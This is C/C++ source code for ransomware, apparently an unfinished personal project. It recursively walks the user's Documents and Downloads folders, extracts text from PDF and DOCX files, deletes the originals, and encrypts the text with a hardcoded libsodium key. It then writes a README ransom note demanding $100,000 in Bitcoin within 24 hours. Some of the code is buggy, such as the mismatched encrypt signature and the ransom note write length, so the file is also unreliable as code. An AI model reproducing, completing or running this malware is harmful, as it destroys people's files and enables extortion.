#include <stdio.h>
#include <dirent.h>
#include <sys/types.h>
#include <string.h>
#include <fcntl.h>
#include <sodium.h>
#include <stdlib.h>
#include <iostream>
#include <poppler/cpp/poppler-document.h>
#include <poppler/cpp/poppler-page.h>
#include <zip.h>
#include </usr/include/libxml2/libxml/parser.h>
#include </usr/include/libxml2/libxml/tree.h>

#include <vector>

using namespace std;

#define MAX_FILE_LEN 2000
#define CHUNK_SIZE 4096
const unsigned char KEY[crypto_secretstream_xchacha20poly1305_KEYBYTES] = {0x6a, 0x07, 0xd3, 0x8a, 0x65, 0xbf, 0x14, 0xe8, 0x31, 0xb4, 0x25, 0xd0, 0xd1, 0x18, 0xc4, 0x22, 0xe5, 0xc9, 0xd5, 0x40, 0x29, 0x08, 0x44, 0x12, 0xe3, 0xf5, 0x2c, 0x1b, 0xc6, 0xe4, 0x1d, 0xa6};

int doEncryptDir(char dirname[], struct dirent *dp, const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES], char *homePath);
int encrypt(char *src_file, char *dest_file, const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES], char *homePath);
int decrypt(char *src_file, char *dest_file, const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES]);
int pdfToText(char *filename, char *raw_pt_file);
int docToText(char *filename, char *raw_pt_file);
void traverseXml(xmlNode *node, FILE *raw_pt_file);

int pdfToText(char *filename, char *raw_pt_file)
{
    poppler::document *pdf = poppler::document::load_from_file(filename);
    int num_pages = pdf->pages();
    FILE *pt_txt = fopen(raw_pt_file, "wb");
    for (int i = 0; i < num_pages; ++i)
    {
        poppler::page *curr_page = pdf->create_page(i);
        // extract text from pdf
        poppler::ustring text = curr_page->text();
        // write to txt file
        poppler::byte_array encoded_text = text.to_utf8();
        std::string pt(encoded_text.begin(), encoded_text.end());
        size_t out_len = fwrite(pt.c_str(), 1, pt.size() - 1, pt_txt);
        if (out_len != (pt.size() - 1))
        {
            return -1;
        }
    }
    fclose(pt_txt);
    remove(filename);
    return 0;
}

int docToText(char *filename, char *raw_pt_file)
{
    int err;
    // open docx file (which is an archive of xmls)
    zip_t *archive = zip_open(filename, 0, &err);
    // open out file
    FILE *pt_file = fopen(raw_pt_file, "wb");
    if (archive == NULL)
    {
        printf("Could not open docx file with name %s\n", filename);
    }
    // open main xml file (word/document.xml), which contains text data
    const char *xml_path = "word/document.xml";
    zip_file_t *doc = zip_fopen(archive, xml_path, 0);
    if (doc == NULL)
    {
        printf("Could not open docx file with name %s\n", filename);
        fclose(pt_file);
        zip_close(archive);
        return -1;
    }
    zip_stat_t st;
    zip_stat(archive, xml_path, 0, &st);
    // read file in one go
    char *buffer_in = (char *)malloc(st.size + 1);
    zip_fread(doc, buffer_in, st.size);
    buffer_in[st.size] = '\0';

    xmlDoc *xml_file = xmlReadMemory(buffer_in, st.size, NULL, NULL, 0);
    xmlNode *root = xmlDocGetRootElement(xml_file);
    traverseXml(root, pt_file);

    // read file text in chunks
    // int rlen;
    // char buffer_in[CHUNK_SIZE];

    // do {
    //     int rlen = zip_fread(doc, buffer_in, CHUNK_SIZE);
    //     if (rlen == -1) {
    //         printf("Error reading doc file!\n");
    //         return rlen;
    //     }
    //     xmlDoc *xml_file = xmlReadMemory(buffer_in, CHUNK_SIZE - 1);
    //     xmlNode *root = xmlDocGetRootElement(xml_file);
    //     xmlNode *curr_node = root;
    //     traverseXml(curr_node);
    //     xmlFreeDoc(xml_file);
    // } while (rlen != 0);
    // while rlen != 0:
    //  if rlen == -1 --> error
    //  else, fread
    //
    xmlFreeDoc(xml_file);
    xmlCleanupParser();
    fclose(pt_file);
    zip_fclose(doc);
    zip_close(archive);
    remove(filename);
    return 0;
}

void traverseXml(xmlNode *node, FILE *raw_pt_file)
{
    // need to make less chatgpt-esque
    for (; node; node = node->next)
    {
        if (node->type == XML_ELEMENT_NODE && xmlStrcmp(node->name, BAD_CAST "t") == 0)
        {
            if (node->children && node->children->content)
                fwrite(node->children->content, 1, strlen((char *)node->children->content), raw_pt_file);
        }
        traverseXml(node->children, raw_pt_file);
    }
}

int main()
{

    // root directory
    char documentsDirname[2000];
    char homePath[2000];
    snprintf(documentsDirname, sizeof(documentsDirname), "%s/Documents", getenv("HOME"));
    snprintf(homePath, sizeof(homePath), "%s/Documents", getenv("HOME"));
    struct dirent *root;
    if (sodium_init() != 0)
    {
        return 1;
    }
    printf("I have done pre encrypt setup\n");
    if (doEncryptDir(documentsDirname, root, KEY, homePath) != 0)
    {
        return 1;
    }
    char downloadsDirname[MAX_FILE_LEN] = "/Downloads"; // Downloads folder
    if (doEncryptDir(downloadsDirname, root, KEY, homePath) != 0)
    {
        return 1;
    }

    // create readme with key for decryption
    FILE *readme = fopen("README.txt", "w");
    const char *payload = "Your files have been encrypted.\n It is impossible to recover them without my secret key.\n To get the key, transfer $100,000 to my Bitcoin account. You have 24 hours.\n";
    fwrite(payload, 1, sizeof(payload), readme);
    fclose(readme);
    return 0;
}

int doEncryptDir(char dirname[], struct dirent *dp, const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES], char *homePath)
{
    // open curr dir
    DIR *dir = opendir(dirname);
    printf("This is dirname %s\n", dirname);
    printf("value of dir is %s\n", dir);
    // print each file/subdirectory in the current dir
    while (dir)
    {
        dp = readdir(dir);
        // BASE CASE: reached end of subdirectory
        if (dp == NULL)
        {
            printf("could not open directory\n");
            // printf("End or directory reached\n");
            closedir(dir);
            return 0;
        }
        // RECURSIVE CASE: print current file/dir in parent dir
        else
        {
            // encrypt file if .pdf or .docx
            char *filename = dp->d_name;
            char filepath[MAX_FILE_LEN];
            char enc_file[MAX_FILE_LEN];
            snprintf(filepath, MAX_FILE_LEN, "%s/%s", dirname, filename);
            snprintf(enc_file, MAX_FILE_LEN, "%s/%s.enc", dirname, filename);

            if (strstr(filename, ".pdf") != NULL)
            {
                printf("Im encryption %s", filename);
                char out_file[MAX_FILE_LEN];
                snprintf(out_file, MAX_FILE_LEN, "%s/%s.txt", dirname, filename);

                if (pdfToText(filepath, out_file) != 0)
                {
                    return -1;
                }
                if (encrypt(out_file, enc_file, key, homePath) != 0)
                {
                    return -1;
                }
            }
            else if (strstr(filename, ".docx") != NULL)
            {
                char out_file[MAX_FILE_LEN];
                snprintf(out_file, MAX_FILE_LEN, "%s/%s.txt", dirname, filename);

                if (docToText(filepath, out_file) != 0)
                {
                    return -1;
                }
                if (encrypt(out_file, enc_file, key, homePath) != 0)
                {
                    return -1;
                }
            }
            else
            {
                printf("Incompatible file type\n");
            }
            char new_dirname[MAX_FILE_LEN];
            strcpy(new_dirname, dirname);
            struct dirent *subdp = NULL;
            // check if file or dir
            if (strchr(dp->d_name, (int)'.'))
            {
                continue;
            }
            strcat(new_dirname, "/");
            strcat(new_dirname, dp->d_name);
            doEncryptDir(new_dirname, subdp, key, homePath);
        }
    }
    closedir(dir);
}

// code adapted from libsodium sample code

int encrypt(char *src_file, char *dest_file, const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES])
{
    // declare vars
    unsigned char buffer_in[CHUNK_SIZE];
    unsigned char buffer_out[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
    crypto_secretstream_xchacha20poly1305_state st;
    unsigned long long out_len;
    size_t rlen;
    int eof;
    unsigned char tag;

    // open pt file
    FILE *fd_s = fopen(src_file, "rb");
    FILE *fd_d = fopen(dest_file, "wb+");
    if (fd_s == NULL)
    {
        printf("Could not find file with path %s\n", src_file);
        return 1;
    }
    if (fd_d == NULL)
    {
        printf("Could not find file with path %s\n", dest_file);
        return 1;
    }
    // initialise header
    crypto_secretstream_xchacha20poly1305_init_push(&st, header, key);
    // copy header into out file
    fwrite(header, 1, sizeof header, fd_d);
    do
    {
        rlen = fread(buffer_in, 1, sizeof buffer_in, fd_s);
        printf("Contents of encrypt buffer_in: %s\n", buffer_in);
        eof = feof(fd_s);
        tag = eof ? crypto_secretstream_xchacha20poly1305_TAG_FINAL : 0;
        // encrypt pt bytes
        crypto_secretstream_xchacha20poly1305_push(&st, buffer_out, &out_len, buffer_in, rlen, NULL, 0, tag);
        // write encrypted text to out file
        fwrite(buffer_out, 1, (size_t)out_len, fd_d);
        printf("Contents of encrypt buffer_out: %x\n", buffer_out);

    } while (!eof);
    // close out file and delete src file
    fclose(fd_d);
    fclose(fd_s);
    remove(src_file);
    return 0;
    // int file_len = fseek(fd, 0, SEEK_END);
    // allocate buffer to store read data

    // while (!feof(fd_s))
    // {
    //     fread(buffer, CHUNK_SIZE, 1, fd_s);
    //     fwrite()
    // }
}

int decrypt(char *src_file, char *dest_file, const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES])
{
    // declare vars
    unsigned char buffer_in[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    unsigned char buffer_out[CHUNK_SIZE];
    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
    crypto_secretstream_xchacha20poly1305_state st;
    unsigned long long out_len;
    size_t rlen;
    int eof;
    unsigned char tag;

    // open pt file
    FILE *fd_s = fopen(src_file, "rb");
    FILE *fd_d = fopen(dest_file, "wb+");
    if (fd_s == NULL)
    {
        printf("Could not find file with path %s\n", src_file);
        return 1;
    }
    if (fd_d == NULL)
    {
        printf("Could not find file with path %s\n", dest_file);
        fclose(fd_s);
        return 1;
    }
    // read header from enc file
    fread(header, 1, sizeof header, fd_s);
    // initialise header
    if (crypto_secretstream_xchacha20poly1305_init_pull(&st, header, key) != 0)
    {
        printf("Error initialising the header of decrypted file\n");
        fclose(fd_d);
        fclose(fd_s);
        return -1;
    }
    do
    {
        // read pt bytes from source file
        rlen = fread(buffer_in, 1, sizeof buffer_in, fd_s);
        printf("Contents of decrypt buffer_in: %x\n", buffer_in);
        eof = feof(fd_s);
        // decrypt pt bytes
        if (crypto_secretstream_xchacha20poly1305_pull(&st, buffer_out, &out_len, &tag, buffer_in, rlen, NULL, 0) != 0)
        {
            printf("Error in decrypted file: corrupted bytes\n");
            fclose(fd_d);
            fclose(fd_s);
            return -1;
        }
        if (tag == crypto_secretstream_xchacha20poly1305_TAG_FINAL)
        {
            if (!eof)
            {
                printf("End of ciphertext stream reached before end of file\n");
                fclose(fd_d);
                fclose(fd_s);
                return -1;
            }
        }
        else
        {
            if (eof)
            {
                printf("End of file reached before end of ciphertext stream\n");
                fclose(fd_d);
                fclose(fd_s);
                return -1;
            }
        }
        // write encrypted text to out file
        fwrite(buffer_out, 1, (size_t)out_len, fd_d);
        printf("Contents of decrypt buffer_out: %x\n", buffer_out);
    } while (!eof);
    // close out file and delete src file
    fclose(fd_d);
    fclose(fd_s);
    return 0;
}
